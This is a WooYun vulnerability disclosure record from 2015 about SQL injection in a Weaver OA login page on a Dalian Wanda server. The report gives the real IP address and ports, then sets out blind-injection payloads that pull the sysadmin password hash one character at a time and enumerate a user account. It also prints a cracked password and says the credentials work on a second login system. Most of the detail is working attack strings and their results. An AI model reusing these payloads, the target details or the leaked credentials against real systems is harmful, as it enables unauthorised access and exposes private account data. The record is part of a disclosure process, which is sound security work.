{"id": 70732, "wybug_id": "wooyun-2015-0134122", "wybug_title": "大连万达集团股份有限公司某站存在SQL注入", "wybug_corp": "大连万达集团股份有限公司", "wybug_author": "浮萍", "wybug_date": "2015-08-14 15:35", "wybug_open_date": "2015-10-01 15:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-01：\t细节向公众公开  简要描述： SQL注入 详细说明：  泛微的OAhttp://60.10.8.227:89/login.do\n\n当输入不存在的用户名时会提示用户未找到(103) 且网页跳转到http://60.10.8.227:89/login.do?message=103&verify=页面当输入一个存在的用户名时 如sysadmin会提示错误: 登录密码不正确(102) \n\n用户名输入sysadmin'and'1'='1提示 登录密码不正确(102) \nloginid=sysadmin' and substring(loginid,1,1) ='s' and 'a' ='a&password=a&clienttype=Webclient&clientver=4.5&language=&country=&verify=\n\n\n\nsysadmin' and len(password)=32 and  'a' ='a\n\n\n存在password字段 且长度为32已知密码为md5加密这里取9-24位\nsysadmin' and(substring(password,9,1)='1') and 'a'='asysadmin' and(substring(password,10,1)='4') and 'a'='asysadmin' and(substring(password,11,1)='e') and 'a'='asysadmin' and(substring(password,12,1)='b') and 'a'='asysadmin' and(substring(password,13,1)='1') and 'a'='asysadmin' and(substring(password,14,1)='e') and 'a'='asysadmin' and(substring(password,15,1)='a') and 'a'='asysadmin' and(substring(password,16,1)='c') and 'a'='asysadmin' and(substring(password,17,1)='5') and 'a'='asysadmin' and(substring(password,18,1)='8') and 'a'='asysadmin' and(substring(password,19,1)='a') and 'a'='asysadmin' and(substring(password,20,1)='1') and 'a'='asysadmin' and(substring(password,21,1)='f') and 'a'='asysadmin' and(substring(password,22,1)='4') and 'a'='asysadmin' and(substring(password,23,1)='8') and 'a'='asysadmin' and(substring(password,24,1)='f') and 'a'='a\nsysadmin' and substring(password,9,16)='14eb1eac58a1f48f' and  'a' ='a则sysadmin对应密码的md5为14eb1eac58a1f48f未解密成功   漏洞证明：  再来找一个用户\na'or len(loginid)=3 and substring(loginid,1,1)='l' a'or len(loginid)=3 and substring(loginid,1,1)='l' and substring(loginid,2,1)='z' and 'a'='aa'or len(loginid)=3 and substring(loginid,1,1)='l' and substring(loginid,2,1)='z' and substring(loginid,3,1)='e' and 'a'='a\n找到一个用户 lze然后通过上述方法找到密码\nff8aaa8a2dde9154\n经解密是123321登录提示错误: 用户没有权限登录手机版本(110) 这个系统和http://60.10.8.227:88/login/Login.jsp?logintype=1用户名密码通用我们使用lze 123321登录\n\n\n\n\n\n\n\n   修复方案：     版权声明：转载请注明来源 浮萍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-08-17 15:38 厂商回复： 感谢浮萍同学的关注与贡献，马上通知业务整改！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}